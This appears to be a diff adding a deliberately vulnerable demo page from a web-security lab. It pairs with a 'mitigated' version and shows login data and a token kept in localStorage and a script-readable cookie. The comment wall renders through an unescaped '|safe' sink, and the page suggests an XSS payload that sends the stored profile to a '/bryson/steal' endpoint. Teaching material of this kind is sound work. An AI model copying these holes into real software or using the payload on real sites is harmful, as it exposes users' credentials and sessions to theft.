@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Bryson &mdash; Vulnerable</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 760px; margin: 2rem auto; padding: 0 1rem; line-height: 1.5; }
+    .banner { background: #fdecea; border-left: 5px solid #c0392b; padding: .6rem 1rem; border-radius: 6px; }
+    input { padding: .4rem; margin: .2rem 0; }
+    pre { background: #f4f4f4; padding: .8rem; border-radius: 6px; overflow-x: auto; }
+    .comment { border-bottom: 1px solid #eee; padding: .4rem 0; }
+    code { background: #f4f4f4; padding: .1rem .3rem; border-radius: 4px; }
+    a { color: #2c3e50; }
+  </style>
+</head>
+<body>
+  <p><a href="/">&larr; Home</a> | <a href="/bryson/mitigated">See mitigated version</a></p>
+  <div class="banner"><strong>VULNERABLE.</strong> Sensitive data is stored in
+     <code>localStorage</code> and a readable cookie.</div>
+
+  <h2>Log in</h2>
+  <form id="login">
+    <input name="username" placeholder="username" value="alice"><br>
+    <input name="password" type="password" placeholder="password" value="password123"><br>
+    <button type="submit">Log in</button>
+  </form>
+
+  <h3>Stored profile (read back from the browser)</h3>
+  <pre id="profile">Not logged in.</pre>
+
+  <h2>Public comment wall</h2>
+  <form method="POST" action="/bryson/comment">
+    <input type="hidden" name="next" value="/bryson/vulnerable">
+    <input name="body" size="50" placeholder="Leave a comment...">
+    <button type="submit">Post</button>
+  </form>
+  <p style="color:#777;font-size:.9rem">Try an XSS payload that steals the stored data, e.g.<br>
+     <code>&lt;img src=x onerror="fetch('/bryson/steal?d='+encodeURIComponent(localStorage.getItem('profile')))"&gt;</code></p>
+  <div id="comments">
+    {% for c in comments %}
+      <div class="comment">{{ c|safe }}</div>  {# VULNERABLE: unescaped sink #}
+    {% endfor %}
+  </div>
+
+  <script>
+    // Render whatever is stored client-side.
+    function showProfile() {
+      const data = localStorage.getItem("profile");
+      document.getElementById("profile").textContent =
+        (data || "Not logged in.") + "\n\ndocument.cookie: " + document.cookie;
+    }
+    showProfile();
+
+    document.getElementById("login").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const fd = new FormData(e.target);
+      const res = await fetch("/bryson/vulnerable", { method: "POST", body: fd });
+      if (!res.ok) { alert("Login failed"); return; }
+      const profile = await res.json();
+      // VULNERABLE: sensitive data saved where any script can read it.
+      localStorage.setItem("profile", JSON.stringify(profile));
+      document.cookie = "token=" + profile.token + "; path=/";
+      showProfile();
+    });
+  </script>
+</body>
+</html>
